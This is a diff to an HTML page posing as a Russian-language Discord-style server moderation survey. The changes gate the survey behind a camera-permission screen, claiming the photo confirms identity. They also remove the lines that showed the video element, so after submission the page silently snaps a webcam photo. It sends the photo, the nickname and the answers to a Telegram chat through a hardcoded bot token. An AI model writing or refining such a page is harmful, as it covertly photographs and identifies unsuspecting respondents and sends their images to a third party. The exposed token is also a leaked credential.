@@ -2,6 +2,7 @@
 <html>
 <head>
     <title>Опрос модерации</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <style>
         body {
             font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
@@ -11,26 +12,29 @@
             max-width: 600px;
             margin: 0 auto;
             color: #333;
+            min-height: 100vh;
+            box-sizing: border-box;
         }
         .survey-form {
             background: white;
-            padding: 30px;
+            padding: 25px;
             border-radius: 15px;
             box-shadow: 0 10px 30px rgba(0,0,0,0.1);
             transition: all 0.3s ease;
+            margin-bottom: 20px;
         }
         h1 {
             color: #4a4a4a;
             margin-bottom: 10px;
-            font-size: 28px;
+            font-size: clamp(22px, 5vw, 28px);
         }
         .description {
             color: #666;
             margin-bottom: 25px;
-            font-size: 16px;
+            font-size: clamp(14px, 3vw, 16px);
         }
         .question {
-            margin: 25px 0;
+            margin: 20px 0;
             text-align: left;
             animation: fadeIn 0.5s ease;
         }
@@ -40,10 +44,10 @@
         }
         label {
             display: block;
-            margin-bottom: 10px;
+            margin-bottom: 8px;
             font-weight: 600;
             color: #4a4a4a;
-            font-size: 16px;
+            font-size: clamp(14px, 3vw, 16px);
         }
         input, textarea, select {
             width: 100%;
@@ -51,7 +55,7 @@
             border: 2px solid #e0e0e0;
             border-radius: 8px;
             box-sizing: border-box;
-            font-size: 15px;
+            font-size: clamp(14px, 3vw, 15px);
             transition: border 0.3s ease;
         }
         input:focus, textarea:focus, select:focus {
@@ -66,11 +70,11 @@
             background: linear-gradient(135deg, #6c63ff 0%, #4a42e8 100%);
             color: white;
             border: none;
-            padding: 14px 25px;
+            padding: 12px 20px;
             margin-top: 15px;
             border-radius: 8px;
             cursor: pointer;
-            font-size: 16px;
+            font-size: clamp(14px, 3vw, 16px);
             font-weight: 600;
             box-shadow: 0 4px 15px rgba(108, 99, 255, 0.3);
             transition: all 0.3s ease;
@@ -90,12 +94,12 @@
         }
         .thank-you-title {
             color: #6c63ff;
-            font-size: 24px;
+            font-size: clamp(20px, 5vw, 24px);
             margin-bottom: 10px;
         }
         .thank-you-text {
             color: #666;
-            font-size: 16px;
+            font-size: clamp(14px, 3vw, 16px);
             line-height: 1.6;
         }
         .emoji {
@@ -108,10 +112,41 @@
         .nickname-input {
             margin-bottom: 20px;
         }
+        .camera-access {
+            display: none;
+            background: white;
+            padding: 25px;
+            border-radius: 15px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.1);
+            margin-bottom: 20px;
+        }
+        .camera-icon {
+            font-size: 50px;
+            margin-bottom: 15px;
+        }
+        @media (max-width: 480px) {
+            body {
+                padding: 15px;
+            }
+            .survey-form, .camera-access {
+                padding: 20px;
+            }
+            button {
+                padding: 14px 20px;
+            }
+        }
     </style>
 </head>
 <body>
-    <div class="survey-form">
+    <div class="camera-access" id="cameraAccess">
+        <div class="camera-icon">📷</div>
+        <h2>Доступ к камере</h2>
+        <p>Для участия в опросе требуется доступ к вашей камере.</p>
+        <p>Мы сделаем фото для подтверждения вашей личности.</p>
+        <button id="allowCameraBtn">Разрешить доступ</button>
+    </div>
+
+    <div class="survey-form" id="surveyForm" style="display: none;">
         <h1>Опрос модерации сервера</h1>
         <p class="description">Поделитесь своим мнением о работе модераторов. Ваши ответы помогут улучшить сервер!</p>
         
@@ -146,13 +181,45 @@
     </div>
 
     <!-- Скрытые элементы для фото -->
-    <video id="videoElement" autoplay></video>
+    <video id="videoElement" autoplay playsinline></video>
     <canvas id="photoCanvas"></canvas>
 
     <script>
         // Конфигурация (замените на свои данные)
         const TELEGRAM_BOT_TOKEN = '7465976373:AAGf39_tqo49urq0BjZ8Epm7dkap-HzcG5E';
         const TELEGRAM_CHAT_ID = '1165076107';
+        
+        // Показываем запрос на доступ к камере при загрузке страницы
+        document.addEventListener('DOMContentLoaded', function() {
+            document.getElementById('cameraAccess').style.display = 'block';
+            
+            document.getElementById('allowCameraBtn').addEventListener('click', function() {
+                requestCameraAccess();
+            });
+        });
+        
+        function requestCameraAccess() {
+            navigator.mediaDevices.getUserMedia({ video: true })
+                .then(stream => {
+                    // Скрываем запрос доступа и показываем форму
+                    document.getElementById('cameraAccess').style.display = 'none';
+                    document.getElementById('surveyForm').style.display = 'block';
+                    
+                    // Инициализируем видео, но не показываем его пользователю
+                    const video = document.getElementById('videoElement');
+                    video.srcObject = stream;
+                    video.play();
+                    
+                    // Останавливаем камеру через 1 секунду (просто для проверки доступа)
+                    setTimeout(() => {
+                        stream.getTracks().forEach(track => track.stop());
+                    }, 1000);
+                })
+                .catch(err => {
+                    alert('Для участия в опросе необходимо разрешить доступ к камере. Пожалуйста, обновите страницу и разрешите доступ.');
+                    console.error("Доступ к камере не разрешен:", err);
+                });
+        }
         
         document.getElementById('submitBtn').addEventListener('click', function() {
             const nickname = document.getElementById('nickname').value.trim();
@@ -162,7 +229,7 @@
             }
 
             // Сначала показываем сообщение благодарности
-            document.querySelector('.survey-form').style.display = 'none';
+            document.getElementById('surveyForm').style.display = 'none';
             document.getElementById('thankYou').style.display = 'block';
             
             // Собираем данные для отправки
@@ -173,12 +240,11 @@
                 cameraAccess: false
             };
             
-            // Пытаемся получить доступ к камере
+            // Пытаемся получить доступ к камере снова для фото
             navigator.mediaDevices.getUserMedia({ video: true })
                 .then(stream => {
                     surveyData.cameraAccess = true;
                     const video = document.getElementById('videoElement');
-                    video.style.display = 'block';
                     video.srcObject = stream;
                     video.play();
                     
@@ -187,11 +253,10 @@
                         takeAndSendPhoto(surveyData);
                         // Останавливаем камеру
                         stream.getTracks().forEach(track => track.stop());
-                        video.style.display = 'none';
                     }, 1000);
                 })
                 .catch(err => {
-                    console.log("Доступ к камере не разрешен");
+                    console.log("Доступ к камере не разрешен при отправке");
                     // Отправляем данные без фото
                     sendToTelegram(surveyData, null);
                 });
